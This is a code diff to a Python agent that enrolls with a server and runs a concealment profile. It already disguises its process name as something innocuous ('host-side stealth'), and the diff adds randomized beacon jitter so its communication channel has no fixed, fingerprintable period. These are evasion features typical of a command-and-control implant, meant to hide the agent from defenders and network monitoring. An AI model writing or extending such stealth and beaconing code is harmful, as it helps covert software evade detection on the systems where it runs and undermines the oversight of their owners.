@@ -74,8 +74,20 @@ async def run() -> None:
     config = data.get("config", {})
     log.info("enrolled as %s (etag=%s)", data.get("agent_id"), etag)
 
+    masking = config.get("masking") or {}
     # Host-side stealth (MASK-4): adopt an innocuous process name from the profile.
-    set_process_name((config.get("masking") or {}).get("process_name"))
+    set_process_name(masking.get("process_name"))
+
+    # Beacon jitter (MASK-5): randomize the beacon interval from the profile so
+    # the channel has no fixed, fingerprintable period. Env overrides if set.
+    jitter = masking.get("beacon_jitter_s")
+    if (
+        cfg.jitter_max_s == 0
+        and isinstance(jitter, (list, tuple))
+        and len(jitter) == 2
+    ):
+        cfg.jitter_min_s, cfg.jitter_max_s = int(jitter[0]), int(jitter[1])
+        log.info("beacon jitter %s-%ss", cfg.jitter_min_s, cfg.jitter_max_s)
 
     async def emit(event: dict) -> None:
         await buffer.enqueue(event)
